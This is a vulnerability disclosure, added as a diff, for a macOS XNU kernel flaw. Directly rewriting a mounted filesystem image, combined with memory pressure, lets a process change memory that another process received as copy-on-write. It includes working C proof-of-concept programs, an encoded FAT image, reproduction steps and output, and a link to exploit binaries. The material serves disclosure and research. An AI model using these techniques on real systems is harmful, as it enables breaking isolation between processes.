@@ -1,0 +1,180 @@
+XNU has various interfaces that permit creating copy-on-write copies of data
+between processes, including out-of-line message descriptors in mach messages.
+It is important that the copied memory is protected against later modifications
+by the source process; otherwise, the source process might be able to exploit
+double-reads in the destination process.
+
+This copy-on-write behavior works not only with anonymous memory, but also with
+file mappings. This means that, after the destination process has started
+reading from the transferred memory area, memory pressure can cause the pages
+holding the transferred memory to be evicted from the page cache. Later, when
+the evicted pages are needed again, they can be reloaded from the backing
+filesystem.
+
+This means that if an attacker can mutate an on-disk file without informing the
+virtual management subsystem, this is a security bug.
+
+MacOS permits normal users to mount filesystem images. When a mounted filesystem
+image is mutated directly (e.g. by calling pwrite() on the filesystem image),
+this information is not propagated into the mounted filesystem.
+
+
+The following is a simple proof-of-concept that demonstrates the problem, split
+across multiple small helpers for simplicity:
+
+
+buggycow.c (opens a file from a FAT image mount, creates a CoW mapping, and
+reads from it when requested):
+===============
+#include <sys/mman.h>
+#include <fcntl.h>
+#include <err.h>
+#include <stdio.h>
+#include <mach/mach.h>
+#include <mach/mach_vm.h>
+
+int main(void) {
+  setbuf(stdout, NULL);
+
+  int fd = open("/Volumes/NO NAME/testfile", O_RDWR);
+  if (fd == -1) err(1, "open");
+  unsigned int *mapping = mmap(NULL, 0x4000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
+  if (mapping == MAP_FAILED) err(1, "mmap");
+
+  pointer_t cow_mapping;
+  mach_msg_type_number_t cow_mapping_size;
+  if (vm_read(mach_task_self(), (mach_vm_address_t)mapping, 0x4000, &cow_mapping, &cow_mapping_size) != KERN_SUCCESS) errx(1, "vm read");
+  if (cow_mapping_size != 0x4000) errx(1, "vm read size");
+
+  while (1) {
+    printf("orig mapping has value 0x%x, cow mapping has value 0x%x\n", *mapping, *(unsigned int*)cow_mapping);
+    printf("press enter to continue: ");
+    getchar();
+  }
+}
+===============
+
+mod.c (modifies file contents inside the FAT filesystem image):
+===============
+#include <fcntl.h>
+#include <err.h>
+#include <unistd.h>
+#include <stdio.h>
+
+int main(void) {
+  int fd = open("fatimg.img", O_RDWR);
+  if (fd == -1) err(1, "open");
+  if (pwrite(fd, "AAAA", 4, 0x37000) != 4) err(1, "pwrite");
+  printf("done\n");
+}
+===============
+
+pressure.c (creates memory pressure; you may have to change `SIZE` such that it
+is significantly bigger than the amount of RAM in your test machine):
+===============
+#include <err.h>
+#include <sys/mman.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <stdio.h>
+
+#define SIZE (1024UL*1024UL*1024UL*20UL)
+
+int main(void) {
+  int fd = open("spamfile", O_RDWR|O_TRUNC|O_CREAT, 0666);
+  if (fd == -1) err(1, "open");
+  if (ftruncate(fd, SIZE)) err(1, "ftruncate");
+  char *mapping = mmap(NULL, SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
+  if (mapping == MAP_FAILED) err(1, "mmap");
+  if (madvise(mapping, SIZE, MADV_RANDOM)) err(1, "madvise");
+  puts("mapped");
+  for (unsigned long off = 0; off < SIZE; off++) {
+    mapping[off] = 42;
+  }
+  puts("done");
+}
+===============
+
+fatimg.img.bz2.base64 (FAT filesystem with a single file "testfile" in
+it, which contains the string "HELLO WORLD AAAA", stored at offset 0x37000):
+===============
+QlpoOTFBWSZTWWCuw5MFfk7//d/7wSDRITEEZ2ffiTfv3KZAAEgIAJQECUBCBAlAybABOE1hqp+i
+kfkjETATJkwJgGiGIY1NM1PQEbU2jRqFTIjRmpo0ADRoMgAAAAGTJgTIARSSIaaZNGjQNAAAAAGg
+AAaNAGJ+LRgQ8YFAZoEEE/idIUFFFRJ4qiiqibs6RBGfFDBkXMCKKKqJFHpmCRSJUy7KhlXpv+9v
+3xSiKkuWmWKvXPKtepMgooqomAQta6v5itC2YCvDFO2sRZn2nInTRQ0JDp3gdpjD2ksNgl5x3wDH
+Im3IkclmyVSy9hRzIWICM3xvZFLMqoTCM/zPU/QuS7kTsbg0EpXafayp5MmFUFvIVffyBxYWMQxC
+mELiRSUEmFTeEU2GyYJz4a6Bk9/eOGIUssEiThI2PAmlnHmgOGYdB6KHlZpCKIIOtCUdYeCKc8zg
+de5s8XX09eXR3r0f+n1NGwwBRRVRJ1oZEJSIkf5igrJMprIcE8W+Ar8cgAGAAAAQQABhAJqMhUBL
+UhUBLmKCskymsgePd5wAyE6AEYAAAAQAEEAAYZgKU0yogi2Kogi8XckU4UJCdb3A9A==
+===============
+
+
+To reproduce:
+
+Unpack and compile the files:
+
+$ base64 -D < fatimg.img.bz2.base64 | bunzip2 > fatimg.img
+$ cc -o buggycow buggycow.c
+$ cc -o mod mod.c
+$ cc -o pressure pressure.c
+$
+
+Mount the filesystem image (e.g. by double-clicking on it in finder).
+
+In one terminal:
+
+$ ./buggycow 
+orig mapping has value 0x4c4c4548, cow mapping has value 0x4c4c4548
+press enter to continue: 
+
+In a second terminal:
+
+$ ./mod
+done
+$ ./pressure 
+mapped
+
+
+Once you can see in "top" that there has been no physical memory anymore for a
+while - or when ./pressure has finished running -, go back to the first terminal
+and press enter. You should see this:
+
+$ ./buggycow 
+orig mapping has value 0x4c4c4548, cow mapping has value 0x4c4c4548
+press enter to continue: 
+orig mapping has value 0x41414141, cow mapping has value 0x41414141
+press enter to continue:
+
+(Weirdly, when you kill the ./pressure helper, e.g. by pressing CTRL+C, it
+takes minutes before the process actually disappears.)
+
+
+Ian made a proof of concept that demonstrates that this also applies to COW
+mappings created via out-of-line descriptors in mach messages; I've attached
+this PoC as mOOM_COW.tar.bz2. Usage:
+
+$ tar xf mOOM_COW.tar.bz2
+$ cd mOOM_COW
+$ vi mOOM_COW.c # edit RAM_GB in the first line to the amount of RAM in your machine
+$ cc -o mOOM_COW mOOM_COW.c
+$ ./mOOM_COW
+[+] child got stashed port
+[+] child sent hello message to parent over shared port
+[+] parent received hello message from child
+[+] child restored stolen port
+[+] mounted fatimg
+[+] child sent message to parent
+[+] parent got an OOL descriptor for 4000 bytes, mapped COW at: 0x10bead000
+[+] parent reads: 4c4c4548
+[+] telling child to try to change what I see!
+[+] child received ping to start trying to change the OOL memory!
+[+] child wrote to the file underlying the mount
+
+[+] child is spamming
+[+] child has finished spamming
+[+] parent got ping message from child, lets try to read again...
+[+] parent reads: 41414141
+
+
+Proof of Concept:
+https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/46478.zip
